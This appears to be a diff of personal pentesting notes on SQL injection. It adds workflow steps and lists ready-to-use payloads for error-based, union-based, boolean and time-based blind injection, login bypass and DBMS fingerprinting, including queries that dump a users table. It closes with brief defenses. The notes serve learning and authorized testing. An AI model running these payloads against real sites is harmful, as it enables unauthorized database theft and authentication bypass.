@@ -57,10 +57,15 @@ Can be a lot stealthier than automated testing.
 **Generic Workflow**
 
 1. find all input fields on the website
-2. initially check each field if it is vulnerable to SQLi - see [[#Discovery Payloads]]
+2. initially check each field if it is vulnerable to SQLi - see [[#Initial Discovery Payloads]]
 3. confirm the type of sqli and weaponize it according to its type:
 	- see overview in [[#Fundamentals]]
 	- see [PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/SQL%20Injection/) and [HackTricks](https://book.hacktricks.wiki/en/pentesting-web/sql-injection/index.html) for great explanations and snippets
+4. Enumerate the DBMS - see [[2 Tech-Specifics/Database/Standard SQL Cheat Sheet|Standard SQL Cheat Sheet]], [[#Implementation Specific Methods]] and
+	1. enumerate existing databases
+	2. enumerate tables of databases
+	3. enumerate schema/columns of databases
+	4. extract data
 
 > [!Hint]
 > All sql injection payloads use the following **basic structure**:
@@ -70,9 +75,9 @@ Can be a lot stealthier than automated testing.
 > - always end by commenting the rest of the legitimate query in the backend out: `-- //`
 > 	- Note: the `//` helps to keep the necessary whitespace, even if the webapp truncates whitepace at the end of the input
 
-### Discovery Payloads
+### Initial Discovery Payloads
 
-```sql
+```
 '
 ''
 "
@@ -100,13 +105,29 @@ Occurs when error messages are directly returned to the user
 **Workflow:**
 
 1. **Discovery:** break SQL query until an error message is produced
-2. craft an error to contain information that we want to extract - try the following payloads:
-
-- e.g. `' or 1=1 in (select @@version) -- //` to make the database version of a MySQL database show up in the error message
-- e.g. `' OR 1=1 in (SELECT * FROM users) -- //` to dump the whole user table
+2. Verify that actual data is returned, by using `version()` or `database()` as injected query
+3. If you found a working injection point enumerate & extract data as described in the [[#Manual Testing]] workflow
+	- e.g. `' OR 1=1 in (SELECT * FROM users) -- //` to dump the whole "users" table from the present database
 	- if that does not work, query one column at a time - e.g. ` or 1=1 in (SELECT id FROM users) -- //`
 
 **Discovery Payloads:**
+
+For [[2 Tech-Specifics/Database/MySQL|MySQL]]:
+
+```
+
+' OR 1=1 in (SELECT <injected_query>)-- //
+' AND extractvalue(1, concat(0x3a, <injected_query>))-- //
+
+```
+
+For [[2 Tech-Specifics/Database/MSSQL|MSSQL]] and [[2 Tech-Specifics/Database/PostgreSQL|PostgreSQL]]:
+
+```
+' select cast(<injected_query> as integer)-- //
+```
+
+Trying to cast the return-value of `version()` to an integer results in an error showing the DBMS type and version.
 
 ##### Union-Based
 
@@ -126,15 +147,16 @@ you must satisfy the two conditions of the [[2 Tech-Specifics/Database/Standard 
 	- use `%' UNION SELECT 'a1', 'a2', 'a3', 'a`...`' -- //`to see which column is represented where in the output
 	- the you can try to infer the datatype from the data and match columns in the union statement accordingly
 Based on that information, craft the union statement - use `null`to not add data to a specific column
-e.g. show database information: `' UNION SELECT database(), user(), null, @@version, null -- //`
-e.g. show tables and their columns in the active database: `' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //`
+- e.g. show database information: `' UNION SELECT database(), user(), null, @@version, null -- //`
+- e.g. show tables and their columns in the active database: `' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //`
+- Inn [[2 Tech-Specifics/Database/MySQL|MySQL]] e.g. use `(SELECT group_concat(<column_names> SEPARATOR '\n'aa) from ... where ...)` to concatenate multiple query results into one string within one column
 
 > [!Hint] Hint
 > While testing make sure the legitimate results are shown, e.g. by providing a valid query or a wild card query (`%`).
 
 **Discovery Payloads:**
 
-```sql
+```
 ' ORDER BY 1 -- //
 ' UNION SELECT NULL -- //
 ' UNION SELECT NULL,NULL -- //
@@ -150,16 +172,13 @@ e.g. show tables and their columns in the active database: `' union select null,
 1. find something on the website that changes if the query is true/false.
 2. then you can start enumerating and building the sql query step by step:
 	1. check how many colums the current table has `%' UNION SELECT 1;--`, iteratively add columns 1,2,3,... until it shows true
-	2. enumerate
-		1. database name
-		2. table name
-		3. columns
-		4. rows
+	2. follow the generic workflow in [[#Manual Testing]]
 
 **Example:**`%' UNION SELECT 1,2,3 where database() like 's%';--`
 
 - try different characters in the like statement to find out the first character, then continue with the second character,...
 - later on the statement looks like this: `%' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';`
+**Hint:** You can also use the `substring()` function to iteratively enumerate a value. E.g. `substring(database(),1,1) = 'i'` and later `substring(database(),1,5) = 'infor'`
 
 **Discovery Payloads:**
 
@@ -181,9 +200,11 @@ the sleep() function is used - it is only executed upon a successful UNION state
 2. as with boolean based SQLi, craft the query step by step
 3. later the statement looks like this: `%' UNION SELECT SLEEP(5),2 from users where username='admin' and password like 'a%';`
 
+Sometimes it helps to combine a query result with a known true or false condition using boolean operators: e.g. `user=test' AND IF(1=1, SLEEP(3),0) -- //`
+
 **Discovery Payloads:**
 
-```sql
+```
 ' OR SLEEP(5) -- //
 '; WAITFOR DELAY '0:0:5' -- //
 '; SELECT pg_sleep(5) -- //
@@ -211,7 +232,7 @@ select * from users where username='' and password='' OR 1=1; -- //
 
 **Discovery Payloads:**
 
-```sql
+```
 admin' -- //
 ' OR 1=1 -- //
 ') OR ('1'='1 -- //
@@ -224,13 +245,13 @@ Depends on the DBMS in use - see [[#Implementation specific methods]].
 
 ### Implementation Specific Methods
 
-The exact sql syntax e.g. code execution techniques vary for different databases - check: [Implementation Specifics](2%20Tech-Specifics/Database/Overview%20-%20Database#Implementation%20specifics)
+The exact sql syntax e.g. code execution techniques vary for different databases - check: [[2 Tech-Specifics/Database/Overview - Database#Implementation Specifics|Overview - Database]]
 
 ### DBMS fingerprinting
 
 **Payloads:**
 
-```sql
+```
 ' UNION SELECT @@version -- //        (MySQL/MSSQL)
 ' UNION SELECT version() -- //        (PostgreSQL)
 ' UNION SELECT sqlite_version() -- // (SQLite)
@@ -240,4 +261,4 @@ The exact sql syntax e.g. code execution techniques vary for different databases
 
 1. prepared queries: SQL queries are prepared and the use input is just filled in
 2. input validation: allow-list on user input characters
-3. escaping user input: puts a \ bevor any special characters -> they are interpreted as normal string
+3. escaping user input: puts a `\` before any special characters -> they are interpreted as normal string
